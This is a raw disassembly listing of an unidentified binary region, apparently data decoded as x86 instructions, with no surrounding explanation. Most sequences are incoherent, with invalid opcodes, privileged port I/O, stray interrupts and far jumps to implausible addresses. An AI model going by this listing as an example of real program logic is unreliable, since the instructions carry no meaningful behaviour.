  42674f:	cmp    esi,DWORD PTR [edx]
  426751:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426758:	add    BYTE PTR [eax],al
  42675a:	jns    0x4267d2
  42675c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42675d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42675e:	pop    edi
  42675f:	pop    esp
  426760:	adc    eax,0xab88080
  426765:	iret   
  426766:	push   esp
  426767:	add    BYTE PTR [eax],al
  426769:	add    BYTE PTR [ebx+edx*8],al
  42676c:	pop    esp
  42676d:	mov    eax,0x58cf0a
  426772:	add    BYTE PTR [eax],al
  426774:	jns    0x4267ec
  426776:	fisttp WORD PTR [ecx+0x79]
  426779:	jbe    0x426724
  42677b:	inc    ecx
  42677c:	jns    0x4267f4
  42677e:	loope  0x426723
  426780:	pop    edi
  426781:	fcom   st(4)
  426783:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42678a:	add    BYTE PTR [eax],al
  42678c:	jns    0x426804
  42678e:	lods   eax,DWORD PTR ds:[esi]
  42678f:	push   edi
  426790:	pop    edi
  426791:	jnp    0x4267e8
  426793:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42679a:	add    BYTE PTR [eax],al
  42679c:	jns    0x426814
  42679e:	repnz cmp DWORD PTR [ecx+0x76],edi
  4267a2:	jmp    0x8080:0x35a15f47
  4267a9:	mov    eax,0x64cf0a
  4267ae:	add    BYTE PTR [eax],al
  4267b0:	jns    0x426828
  4267b2:	in     eax,0x18
  4267b4:	int    0x8d
  4267b6:	xor    ch,cl
  4267b8:	xchg   esi,eax
  4267b9:	xor    BYTE PTR [ebx],bh
  4267bb:	(bad)  
  4267bd:	icebp  
  4267be:	shr    ebx,cl
  4267c0:	xchg   edx,eax
  4267c1:	shr    edx,cl
  4267c3:	sub    BYTE PTR [ebx+0x13],dl
  4267c6:	in     al,dx
  4267c7:	xchg   esp,eax
  4267c8:	int    0x96
  4267ca:	xor    ch,cl
  4267cc:	out    0x30,al
  4267ce:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267d4:	stc    
  4267d5:	shr    ecx,cl
  4267d7:	sub    BYTE PTR [ebx-0x27],dl
  4267da:	xor    edx,DWORD PTR [ebx]
  4267dc:	das    
  4267dd:	pop    ecx
  4267de:	mov    WORD PTR [ebp-0x5b],cs
  4267e1:	int    0x96
  4267e3:	xor    ch,cl
  4267e5:	out    0x30,al
  4267e7:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267ed:	stc    
  4267ee:	shr    ecx,cl
  4267f0:	sub    BYTE PTR [ebx-0x27],dl
  4267f3:	int    0xe6
  4267f5:	stc    
  4267f6:	add    al,0x2
  4267f8:	adc    DWORD PTR [edx],0xffffffd3
  4267fb:	fwait
  4267fc:	add    BYTE PTR [eax+0x9033380],0x8c
  426803:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426805:	int    0x96
  426807:	xor    ch,cl
  426809:	lea    esi,[eax]
  42680b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426811:	sub    bl,dl
  426813:	repz xchg edx,eax
  426815:	push   ebx
  426816:	jecxz  0x4267e5
  426818:	(bad)  
  426819:	stc    
  42681a:	xchg   DWORD PTR [ebx],edx
  42681c:	int    0x96
  42681e:	xor    ch,cl
  426820:	out    0x30,al
  426822:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426828:	xchg   edx,eax
  426829:	shr    ecx,cl
  42682b:	sub    BYTE PTR [ebx-0x27],dl
  42682e:	add    al,0xd2
  426830:	mov    BYTE PTR [edx],cl
  426832:	(bad)  
  426833:	stc    
  426834:	inc    ebx
  426835:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  42683b:	int    0x96
  42683d:	xor    BYTE PTR [ebx],bh
  42683f:	(bad)  
  426841:	icebp  
  426842:	shr    ebx,cl
  426844:	xchg   edx,eax
  426845:	shr    edx,cl
  426847:	sub    BYTE PTR [ebx+0x13],dl
  42684a:	or     cl,bh
  42684c:	adc    eax,0xcd0000ff
  426851:	lea    ecx,[ebp+ecx*8-0x6a]
  426855:	dec    esp
  426856:	cmp    ecx,DWORD PTR [edi]
  426858:	cmp    esi,ecx
  42685a:	shr    edx,cl
  42685c:	sub    bl,dl
  42685e:	jmp    0x4267f2
  426860:	push   ebx
  426861:	adc    ecx,edi
  426863:	xchg   esi,eax
  426864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426865:	or     dl,BYTE PTR ds:0xff1dcf
  42686b:	add    BYTE PTR [ecx+0x6b],ah
  42686e:	xor    eax,0x13cd8080
  426873:	mov    eax,0x4258d0a
  426878:	rcl    edx,cl
  42687a:	int    0xfa
  42687c:	mov    eax,0xcf29e60a
  426881:	loopne 0x42682c
  426883:	mov    eax,0x42de60a
  426888:	leave  
  426889:	test   BYTE PTR [eax-0x304d19f6],bh
  42688f:	loopne 0x4268a5
  426891:	mov    eax,0x435e60a
  426896:	leave  
  426897:	loop   0x426851
  426899:	or     ah,dh
  42689b:	cmp    ebp,ecx
  42689d:	cli    
  42689e:	mov    eax,0xcd3de60a
  4268a3:	add    edi,DWORD PTR [eax-0x32be19f6]
  4268a9:	cld    
  4268aa:	mov    eax,0xcd45e60a
  4268af:	add    edi,DWORD PTR [eax-0x322f19f6]
  4268b5:	cli    
  4268b6:	mov    eax,0xcfc2e60a
  4268bb:	loopne 0x4268e6
  4268bd:	mov    eax,0x455e60a
  4268c2:	leave  
  4268c3:	test   BYTE PTR [eax-0x30a619f6],bh
  4268c9:	loopne 0x426860
  4268cb:	mov    eax,0x45de60a
  4268d0:	leave  
  4268d1:	loop   0x42688b
  4268d3:	or     ah,dh
  4268d5:	popa   
  4268d6:	mov    eax,0xb8658d0a
  4268db:	or     dl,BYTE PTR [esi-0x47f33297]
  4268e1:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  4268e7:	int    0x96
  4268e9:	dec    esp
  4268ea:	cmp    esi,ecx
  4268ec:	cmp    ecx,DWORD PTR [edi]
  4268ee:	shr    edx,cl
  4268f0:	sub    bl,dl
  4268f2:	jmp    0x426886
  4268f4:	push   ebx
  4268f5:	adc    ecx,ebp
  4268f7:	xchg   esi,eax
  4268f8:	dec    esp
  4268f9:	int    0xe6
  4268fb:	dec    esp
  4268fc:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426902:	mov    WORD PTR [ebp-0x2c06c430],cs
  426908:	jmp    0x301bbc35
  42690d:	mov    ebx,0xb8d93b5e
  426912:	or     dh,BYTE PTR [ecx]
  426914:	int    0x8d
  426916:	dec    esp
  426917:	int    0x96
  426919:	dec    esp
  42691a:	cmp    ecx,DWORD PTR [edi]
  42691c:	cmp    esi,ecx
  42691e:	shr    ebx,cl
  426920:	xchg   edx,eax
  426921:	shr    edx,cl
  426923:	sub    BYTE PTR [ebx+0x13],dl
  426926:	int    0x96
  426928:	dec    esp
  426929:	iret   
  42692a:	mov    WORD PTR [ebp-0x3266c4db],cs
  426930:	out    0x4c,al
  426932:	shl    ebx,cl
  426934:	xchg   edx,eax
  426935:	cmp    edi,ecx
  426937:	shr    ecx,cl
  426939:	sub    BYTE PTR [ebx-0x27],dl
  42693c:	das    
  42693d:	mov    ebx,0xb8d93b5e
  426942:	or     dh,BYTE PTR [ecx]
  426944:	int    0x8d
  426946:	dec    esp
  426947:	int    0x96
  426949:	dec    esp
  42694a:	cmp    esi,ecx
  42694c:	shr    edx,cl
  42694e:	sub    BYTE PTR [ebx],bh
  426950:	psrlq  mm5,mm3
  426953:	xchg   edx,eax
  426954:	push   ebx
  426955:	adc    ecx,ebp
  426957:	xchg   esi,eax
  426958:	dec    esp
  426959:	int    0xe6
  42695b:	dec    esp
  42695c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426962:	stc    
  426963:	shr    ecx,cl
  426965:	sub    BYTE PTR [ebx-0x27],dl
  426968:	mov    eax,0x9096cc0a
  42696d:	inc    DWORD PTR [eax]
  42696f:	add    ch,cl
  426971:	lea    ecx,[ebp+ecx*8-0x6a]
  426975:	dec    esp
  426976:	cmp    esi,ecx
  426978:	shr    edx,cl
  42697a:	sub    BYTE PTR [ebx],bh
  42697c:	psrlq  mm5,mm3
  42697f:	xchg   edx,eax
  426980:	push   ebx
  426981:	adc    ecx,ebp
  426983:	xchg   esi,eax
  426984:	dec    esp
  426985:	int    0xe6
  426987:	dec    esp
  426988:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42698e:	stc    
  42698f:	shr    ecx,cl
  426991:	sub    BYTE PTR [ebx-0x27],dl
  426994:	mov    eax,0xa496cc0a
  426999:	inc    DWORD PTR [eax]
  42699b:	add    ch,cl
  42699d:	lea    esi,[eax]
  42699f:	int    0x96
  4269a1:	xor    BYTE PTR [ebx],bh
  4269a3:	icebp  
  4269a4:	cmp    ecx,DWORD PTR [edi]
  4269a6:	shr    edx,cl
  4269a8:	sub    bl,dl
  4269aa:	jmp    0x42693e
  4269ac:	push   ebx
  4269ad:	adc    ecx,ebp
  4269af:	xchg   esi,eax
  4269b0:	xor    ch,cl
  4269b2:	out    0x30,al
  4269b4:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4269ba:	xchg   edx,eax
  4269bb:	shr    ecx,cl
  4269bd:	sub    BYTE PTR [ebx-0x27],dl
  4269c0:	xchg   DWORD PTR [ebx],edx
  4269c2:	or     cl,bh
  4269c4:	adc    eax,0xcd0000ff
  4269c9:	lea    ecx,[ebp+ecx*8-0x6a]
  4269cd:	dec    esp
  4269ce:	int    0xe6
  4269d0:	mov    BYTE PTR [ebx],bh
  4269d2:	icebp  
  4269d3:	cmp    ecx,DWORD PTR [edi]
  4269d5:	shr    ebx,cl
  4269d7:	xchg   edx,eax
  4269d8:	shr    edx,cl
  4269da:	sub    BYTE PTR [ebx+0x13],dl
  4269dd:	iret   
  4269de:	push   es
  4269df:	nop
  4269e0:	inc    DWORD PTR [eax]
  4269e2:	add    BYTE PTR [edx],cl
  4269e4:	add    eax,0xff1dcf
  4269e9:	add    bh,cl
  4269eb:	jbe    0x4269bd
  4269ed:	mov    ebp,0x10d8
  4269f2:	int    0x8d
  4269f4:	xor    ch,cl
  4269f6:	xchg   esi,eax
  4269f7:	xor    al,al
  4269f9:	(bad)  
  4269fa:	cmp    ecx,DWORD PTR [edi]
  4269fc:	stos   BYTE PTR es:[edi],al
  4269fd:	cmp    ebx,ecx
  4269ff:	shr    ebx,cl
  426a01:	xchg   edx,eax
  426a02:	shr    edx,cl
  426a04:	sub    BYTE PTR [ebx+0x13],dl
  426a07:	or     al,BYTE PTR ds:0xff1dcf
  426a0d:	add    ch,cl
  426a0f:	jbe    0x426a5d
  426a11:	int    0x8d
  426a13:	dec    esp
  426a14:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a17:	mov    ebp,0xd3f03b92
  426a1c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a20:	aam    0x3c
  426a22:	iret   
  426a23:	push   es
  426a24:	adc    eax,0x700000ff
  426a29:	int    0x76
  426a2b:	xor    ch,cl
  426a2d:	lea    esi,[eax]
  426a2f:	cmp    edi,DWORD PTR [ecx-0x2d]
  426a32:	mov    ebp,0xd3f03b92
  426a37:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a3b:	jo     0x426a0c
  426a3d:	push   es
  426a3e:	and    al,0x0
  426a40:	add    BYTE PTR [eax],al
  426a42:	jo     0x426a11
  426a44:	jbe    0x426a5a
  426a46:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  426a4d:	int    0x8d
  426a4f:	dec    esp
  426a50:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a53:	lock int 0xe6
  426a56:	mov    bl,dl
  426a58:	mov    ebp,0x28f2d392
  426a5d:	push   ebx
  426a5e:	ror    edi,cl
  426a60:	iret   
  426a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a62:	inc    DWORD PTR [eax]
  426a64:	add    BYTE PTR [edx],cl
  426a66:	int3   
  426a67:	push   es
  426a68:	sbb    eax,0xcf0000ff
  426a6d:	jbe    0x426a94
  426a6f:	mov    ebp,0xeff5
  426a74:	int    0x8d
  426a76:	xor    ch,cl
  426a78:	xchg   esi,eax
  426a79:	xor    BYTE PTR [ebx],bh
  426a7b:	psrlq  mm5,mm3
  426a7e:	xchg   edx,eax
  426a7f:	add    al,0xfb
  426a81:	call   ebx
  426a83:	jmp    0xcf05:0xa135328
  426a8a:	sbb    eax,0x610000ff
  426a8f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a95:	xor    eax,0xab88080
  426a9a:	push   es
  426a9b:	jo     0x426a9d
  426a9d:	add    BYTE PTR [eax],al
  426a9f:	iret   
  426aa0:	mov    dh,BYTE PTR [eax]
  426aa2:	mov    eax,0xb4cf0a
  426aa7:	add    BYTE PTR [eax],al
  426aa9:	pop    ebp
  426aaa:	adc    BYTE PTR ds:0xab88080,dh
  426ab0:	push   es
  426ab1:	bound  eax,QWORD PTR [eax]
  426ab3:	add    BYTE PTR [eax],al
  426ab5:	int    0xd2
  426ab7:	mov    eax,0x94060a
  426abc:	add    BYTE PTR [eax],al
  426abe:	int    0xd3
  426ac0:	mov    eax,0x98060a
  426ac5:	add    BYTE PTR [eax],al
  426ac7:	add    al,0x6d
  426ac9:	sub    ch,cl
  426acb:	jge    0x426a85
  426acd:	or     cl,bh
  426acf:	mov    eax,0xcf000000
  426ad4:	mov    ch,BYTE PTR [eax]
  426ad6:	mov    eax,0xbccf0a
  426adb:	add    BYTE PTR [eax],al
  426add:	add    al,0xd3
  426adf:	pusha  
  426ae0:	mov    eax,0xc0cf0a
  426ae5:	add    BYTE PTR [eax],al
  426ae7:	iret   
  426ae8:	mov    cl,BYTE PTR [edx-0x48]
  426aeb:	or     cl,bh
  426aed:	les    eax,FWORD PTR [eax]
  426aef:	add    BYTE PTR [eax],al
  426af1:	int    0xf9
  426af3:	mov    eax,0x9c670a
  426af8:	add    BYTE PTR [eax],al
  426afa:	iret   
  426afb:	loopne 0x426a9d
  426afd:	pop    edi
  426afe:	add    BYTE PTR ds:0xab88080,dh
  426b04:	iret   
  426b05:	enter  0x0,0x0
  426b09:	iret   
  426b0a:	mov    bh,bh
  426b0c:	mov    eax,0x90cf0a
  426b11:	add    BYTE PTR [eax],al
  426b13:	mov    eax,0xa0670a
  426b18:	add    BYTE PTR [eax],al
  426b1a:	add    al,0xc9
  426b1c:	stc    
  426b1d:	mov    eax,0xa4670a
  426b22:	add    BYTE PTR [eax],al
  426b24:	int    0xf9
  426b26:	pop    edi
  426b27:	leave  
  426b28:	xor    eax,0xab88080
  426b2d:	iret   
  426b2e:	add    BYTE PTR [eax],0x0
  426b31:	add    ch,cl
  426b33:	jge    0x426aed
  426b35:	or     cl,bh
  426b37:	aam    0x0
  426b39:	add    BYTE PTR [eax],al
  426b3b:	int    0xc5
  426b3d:	mov    eax,0xe0060a
  426b42:	add    BYTE PTR [eax],al
  426b44:	cmp    ebp,DWORD PTR [ebp-0x48]
  426b47:	or     ah,BYTE PTR [edi-0x58]
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	add    bh,cl
  426b4e:	addr16 in al,0x0
  426b51:	add    BYTE PTR [eax],al
  426b53:	leave  
  426b54:	push   es
  426b55:	lods   al,BYTE PTR ds:[esi]
  426b56:	add    BYTE PTR [eax],al
  426b58:	add    dh,ah
  426b5a:	xor    eax,0x6c9352b
  426b5f:	fadd   DWORD PTR [eax]
  426b61:	add    BYTE PTR [eax],al
  426b63:	jae    0x426b9a
  426b65:	jno    0x426b9c
  426b67:	mov    eax,0x3076cdaf
  426b6c:	int    0x8d
  426b6e:	xor    ch,cl
  426b70:	xchg   esi,eax
  426b71:	xor    BYTE PTR [edx+eax*1],al
  426b74:	call   ebx
  426b76:	repnz sub BYTE PTR [ebx],bh
  426b79:	jns    0x426b4e
  426b7b:	mov    ebp,0xcdd35392
  426b80:	lea    esi,[eax]
  426b82:	add    al,0x2
  426b84:	(bad)  
  426b85:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b8b:	repz xchg edx,eax
  426b8d:	push   ebx
  426b8e:	jecxz  0x426bcb
  426b90:	retf   
  426b91:	add    al,0xd2
  426b93:	sbb    bl,BYTE PTR [ebx]
  426b95:	retf   
  426b96:	cmp    eax,DWORD PTR [eax]
  426b98:	inc    ebx
  426b99:	cli    
  426b9a:	das    
  426b9b:	or     cl,dl
  426b9d:	add    BYTE PTR [eax+0x43888280],0xd2
  426ba4:	das    
  426ba5:	add    al,0x37
  426ba7:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426bae:	xchg   esi,eax
  426baf:	xor    BYTE PTR [ebx],bh
  426bb1:	psrlq  mm5,mm3
  426bb4:	xchg   edx,eax
  426bb5:	add    al,0xfb
  426bb7:	call   ebx
  426bb9:	jmp    0xcd7d:0x87135328
  426bc0:	aad    0xb8
  426bc2:	cmp    edx,DWORD PTR ds:0x708d
  426bc8:	add    ch,cl
  426bca:	lea    esi,[eax]
  426bcc:	int    0xe6
  426bce:	xor    BYTE PTR [ebx],bh
  426bd0:	psrlq  mm5,mm3
  426bd3:	xchg   edx,eax
  426bd4:	add    al,0xf8
  426bd6:	call   ebx
  426bd8:	jmp    0x8832bf05
  426bdd:	jge    0x426b97
  426bdf:	int    0xcc
  426be1:	lea    esi,[eax+0x0]
  426be4:	add    BYTE PTR [eax],al
  426be6:	mov    eax,0xd3b8e3f8
  426beb:	repnz das 
  426bed:	mov    eax,0x53b8f3e3
  426bf2:	jecxz  0x426bc1
  426bf4:	lea    esi,[eax]
  426bf6:	int    0xe6
  426bf8:	xor    BYTE PTR [ebx],bh
  426bfa:	psrlq  mm5,mm3
  426bfd:	xchg   edx,eax
  426bfe:	add    al,0xf8
  426c00:	call   ebx
  426c02:	jmp    0x8832bf2f
  426c07:	jge    0x426bc1
  426c09:	or     dl,BYTE PTR ds:0x708d
  426c0f:	add    ch,cl
  426c11:	lea    esi,[eax]
  426c13:	int    0x96
  426c15:	xor    BYTE PTR [ebx],bh
  426c17:	(bad)  
  426c19:	sti    
  426c1a:	call   ebx
  426c1c:	jmp    0x426bb0
  426c1e:	shr    edx,cl
  426c20:	sub    BYTE PTR [ebx+0x13],dl
  426c23:	int    0x96
  426c25:	xor    BYTE PTR [edi+0x308dcdd3],al
  426c2b:	add    al,0x2
  426c2d:	(bad)  
  426c2e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426c34:	repz xchg edx,eax
  426c36:	push   ebx
  426c37:	jecxz  0x426c74
  426c39:	retf   
  426c3a:	add    al,0xd2
  426c3c:	sbb    bl,BYTE PTR [ebx]
  426c3e:	retf   
  426c3f:	cmp    eax,DWORD PTR [eax]
  426c41:	inc    ebx
  426c42:	cli    
  426c43:	das    
  426c44:	or     ebp,DWORD PTR [esi+0x2f000000]
  426c4a:	pop    es
  426c4b:	pop    ebx
  426c4c:	add    BYTE PTR [eax],al
  426c4e:	add    bl,al
  426c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c51:	mov    esi,0x76cf4229
  426c56:	jne    0x426c62
  426c58:	jbe    0x426be2
  426c5a:	int    0x76
  426c5c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c62:	or     bl,BYTE PTR [ecx+ecx*8]
  426c65:	ins    BYTE PTR es:[edi],dx
  426c66:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c6c:	jbe    0x426ce3
  426c6e:	int    0x8d
  426c70:	jge    0x426ca1
  426c72:	inc    ebp
  426c73:	jge    0x426c07
  426c75:	shr    ebx,cl
  426c77:	xchg   edx,eax
  426c78:	int    0x8d
  426c7a:	jne    0x426c49
  426c7c:	xchg   esi,eax
  426c7d:	jge    0x426cba
  426c7f:	leave  
  426c80:	cmp    ebx,edx
  426c82:	push   ebx
  426c83:	icebp  
  426c84:	int    0x76
  426c86:	cmc    
  426c87:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c8d:	jo     0x426c5e
  426c8f:	push   es
  426c90:	cmc    
  426c91:	inc    DWORD PTR [eax]
  426c93:	add    BYTE PTR [eax-0x2d],dh
  426c96:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c9d:	int    0x76
  426c9f:	in     eax,dx
  426ca0:	int    0x8d
  426ca2:	adc    DWORD PTR [edi],ebp
  426ca4:	inc    ebp
  426ca5:	jge    0x426c39
  426ca7:	shr    ebx,cl
  426ca9:	xchg   edx,eax
  426caa:	int    0x8d
  426cac:	in     eax,dx
  426cad:	int    0x96
  426caf:	adc    ebx,edx
  426cb1:	repnz sub ch,cl
  426cb4:	iret   
  426cb5:	cmc    
  426cb6:	inc    DWORD PTR [eax]
  426cb8:	add    ch,cl
  426cba:	mov    DWORD PTR [ebx],edi
  426cbc:	leave  
  426cbd:	cmp    ebx,edx
  426cbf:	push   ebx
  426cc0:	rol    BYTE PTR [ebx+0x7d],cl
  426cc3:	das    
  426cc4:	push   es
  426cc5:	push   ebp
  426cc6:	add    BYTE PTR [eax-0xa293280],0xc9
  426ccd:	jbe    0x426cdc
  426ccf:	(bad)  
  426cd0:	ficom  WORD PTR ss:[ebx]
  426cd3:	pop    ebp
  426cd4:	mov    ebp,0xa25230a
  426cd9:	jbe    0x426ccc
  426cdb:	or     ah,BYTE PTR [esi-0x6289f56b]
  426ce1:	int    0x76
  426ce3:	xchg   ebp,eax
  426ce4:	int    0x8d
  426ce6:	popf   
  426ce7:	das    
  426ce8:	inc    ebp
  426ce9:	jge    0x426c7d
  426ceb:	shr    ebx,cl
  426ced:	xchg   edx,eax
  426cee:	int    0x8d
  426cf0:	xchg   ebp,eax
  426cf1:	int    0x96
  426cf3:	popf   
  426cf4:	cmp    ecx,ecx
  426cf6:	cmp    ebx,edx
  426cf8:	push   ebx
  426cf9:	icebp  
  426cfa:	bound  eax,QWORD PTR [eax]
  426cfc:	(bad)  
  426cfd:	xor    al,0xd3
  426cff:	repnz sub BYTE PTR [eax],al
  426d02:	pop    ecx
  426d03:	xor    eax,0xbd808081
  426d08:	push   eax
  426d09:	repnz add BYTE PTR [eax],al
  426d0c:	int    0x76
  426d0e:	xchg   ebp,eax
  426d0f:	int    0x8d
  426d11:	popf   
  426d12:	das    
  426d13:	inc    ebp
  426d14:	jge    0x426ca8
  426d16:	shr    ebx,cl
  426d18:	xchg   edx,eax
  426d19:	int    0x8d
  426d1b:	xchg   ebp,eax
  426d1c:	int    0x96
  426d1e:	popf   
  426d1f:	cmp    ecx,ecx
  426d21:	cmp    ebx,edx
  426d23:	push   ebx
  426d24:	icebp  
  426d25:	bound  eax,QWORD PTR [eax]
  426d27:	pop    ecx
  426d28:	xor    eax,0xd3808081
  426d2d:	repnz sub BYTE PTR [eax],al
  426d30:	pop    ecx
  426d31:	sub    eax,0xbd808081
  426d36:	xchg   edx,eax
  426d37:	repnz add BYTE PTR [eax],al
  426d3a:	int    0x7
  426d3c:	xor    eax,0xcd808081
  426d41:	mov    ch,cl
  426d43:	jle    0x426da9
  426d45:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426d4b:	lea    ecx,ds:0x2ff176cd
  426d51:	inc    ebp
  426d52:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d58:	jbe    0x426d67
  426d5a:	int    0x96
  426d5c:	icebp  
  426d5d:	cmp    esi,eax
  426d5f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d65:	ror    ebp,cl
  426d67:	lea    ecx,[eax+0x187ebb2f]
  426d6d:	push   es
  426d6e:	jge    0x426d44
  426d70:	dec    esp
  426d71:	int    0x7
  426d73:	popf   
  426d74:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d7e:	jbe    0x426dcc
  426d80:	int    0x76
  426d82:	xor    BYTE PTR [eax],al
  426d84:	(bad)  
  426d85:	cmp    al,0x0
  426d87:	(bad)  
  426d88:	cmc    
  426d89:	add    dh,dl
  426d8b:	sub    al,0x0
  426d8d:	(bad)  
  426d8e:	and    al,0x0
  426d90:	(bad)  
  426d91:	sbb    al,0x0
  426d93:	(bad)  
  426d94:	adc    al,0xbd
  426d96:	test   ch,dh
  426d98:	add    BYTE PTR [eax],al
  426d9a:	or     al,BYTE PTR [esi]
  426d9c:	adc    edi,edi
  426d9e:	add    BYTE PTR [eax],al
  426da0:	int    0x76
  426da2:	cmp    al,0x4
  426da4:	fcom   QWORD PTR [eax+eax*4]
  426da7:	aam    0x1a
  426da9:	int    0x76
  426dab:	cmp    al,0x4
  426dad:	fsub   QWORD PTR [eax+eax*4]
  426db0:	aam    0x4e
  426db2:	int    0x6
  426db4:	adc    edi,edi
  426db6:	add    BYTE PTR [eax],al
  426db8:	int    0x8d
  426dba:	cmp    al,0xa
  426dbc:	outs   dx,BYTE PTR ds:[esi]
  426dbd:	sbb    al,0xec
  426dbf:	push   ebx
  426dc0:	add    dh,dl
  426dc2:	cmp    al,0x0
  426dc4:	(bad)  
  426dc5:	cmc    
  426dc6:	mov    ebp,0x6daa
  426dcb:	stos   BYTE PTR es:[edi],al
  426dcc:	test   al,0x63
  426dce:	retf   
  426dcf:	shl    BYTE PTR [eax+eax*4],cl
  426dd2:	xchg   esi,eax
  426dd3:	int    0xed
  426dd5:	jno    0x426e48
  426dd7:	cwde   
  426dd8:	leave  
  426dd9:	jbe    0x426dd8
  426ddb:	dec    ecx
  426ddc:	and    DWORD PTR [esi-0x68936cb],eax
  426de2:	inc    ecx
  426de3:	and    DWORD PTR [esi-0x28932cb],eax
  426de9:	int    0xd6
  426deb:	std    
  426dec:	sar    bh,0x5f
  426def:	shl    DWORD PTR [ecx],1
  426df1:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426df7:	sti    
  426df8:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426dfe:	push   ebx
  426dff:	jns    0x426dce
  426e01:	(bad)  
  426e02:	mov    BYTE PTR [ebx+0x11],al
  426e05:	int    0x76
  426e07:	std    
  426e08:	aam    0xc4
  426e0a:	int    0xd6
  426e0c:	std    
  426e0d:	cmp    edx,ebx
  426e0f:	cmp    edi,ebx
  426e11:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426e17:	push   ebx
  426e18:	jns    0x426de7
  426e1a:	(bad)  
  426e1b:	dec    esp
  426e1c:	inc    ebx
  426e1d:	adc    esp,edx
  426e1f:	pop    ebx
  426e20:	int    0x96
  426e22:	xor    BYTE PTR [edx-0x32b31933],bl
  426e28:	jbe    0x426db2
  426e2a:	cmp    esi,edi
  426e2c:	push   es
  426e2d:	add    ah,dl
  426e2f:	push   esi
  426e30:	pop    ebx
  426e31:	retf   0x8624
  426e34:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426e3a:	das    
  426e3b:	push   es
  426e3c:	fcmovbe st,st(6)
  426e3e:	dec    esi
  426e3f:	add    al,0xf4
  426e41:	adc    DWORD PTR [edx],0xffffffc5
  426e44:	fwait
  426e45:	add    BYTE PTR [eax+0x2fa60980],0xec
  426e4c:	dec    esp
  426e4d:	adc    ch,ah
  426e4f:	in     eax,dx
  426e50:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e57:	lea    ebp,[edi]
  426e59:	retf   0x2fa6
  426e5c:	or     DWORD PTR [esi+eax*4],esp
  426e5f:	js     0x426ea4
  426e61:	clc    
  426e62:	or     BYTE PTR [esi],0x63
  426e65:	int    0x76
  426e67:	stc    
  426e68:	cmp    edx,ebx
  426e6a:	int    0x8d
  426e6c:	stc    
  426e6d:	add    al,0x2
  426e6f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e75:	std    
  426e76:	cmp    edx,ebx
  426e78:	int    0x8d
  426e7a:	std    
  426e7b:	cmp    edx,DWORD PTR [ebx]
  426e7d:	shl    edx,cl
  426e7f:	sub    bl,dl
  426e81:	mov    ebp,0xa8d35392
  426e86:	retf   
  426e87:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e8b:	int    0xed
  426e8d:	add    al,0xed
  426e8f:	(bad)  
  426e90:	leave  
  426e91:	jbe    0x426e90
  426e93:	dec    ecx
  426e94:	and    DWORD PTR [esi+0x21416135],eax
  426e9a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426ea0:	jbe    0x426eb6
  426ea2:	or     dh,BYTE PTR [esi+0x14]
  426ea5:	int    0x76
  426ea7:	adc    al,0xcd
  426ea9:	add    DWORD PTR ds:0xcd808081,ebp
  426eaf:	lea    edx,[ecx*8+0x2d0acd80]
  426eb6:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426ec0:	lea    esi,[ebp-0x32028933]
  426ec6:	(bad)  
  426ec7:	std    
  426ec8:	cwde   
  426ec9:	call   0x3b85:0x82cfffc0
  426ed0:	jns    0x426ea5
  426ed2:	mov    ebp,0xf03baa92
  426ed7:	shl    edx,cl
  426ed9:	sub    BYTE PTR [ebx-0x2d],dl
  426edc:	or     dh,BYTE PTR [esi-0x63]
  426edf:	int    0x76
  426ee1:	std    
  426ee2:	int    0x8d
  426ee4:	std    
  426ee5:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ee8:	mov    ebp,0xd3f03b92
  426eed:	repnz sub BYTE PTR [ebx-0x2d],dl
  426ef1:	or     dh,BYTE PTR [esi-0x53]
  426ef4:	int    0x76
  426ef6:	mov    ch,0xcd
  426ef8:	ins    BYTE PTR es:[edi],dx
  426ef9:	jo     0x426eff
  426efb:	mov    ebp,0xf1760a4c
  426f00:	int    0x76
  426f02:	mov    ch,0xcd
  426f04:	ins    BYTE PTR es:[edi],dx
  426f05:	pop    esp
  426f06:	int    0x8d
  426f08:	mov    ch,0x7c
  426f0a:	push   es
  426f0b:	outs   dx,BYTE PTR ds:[esi]
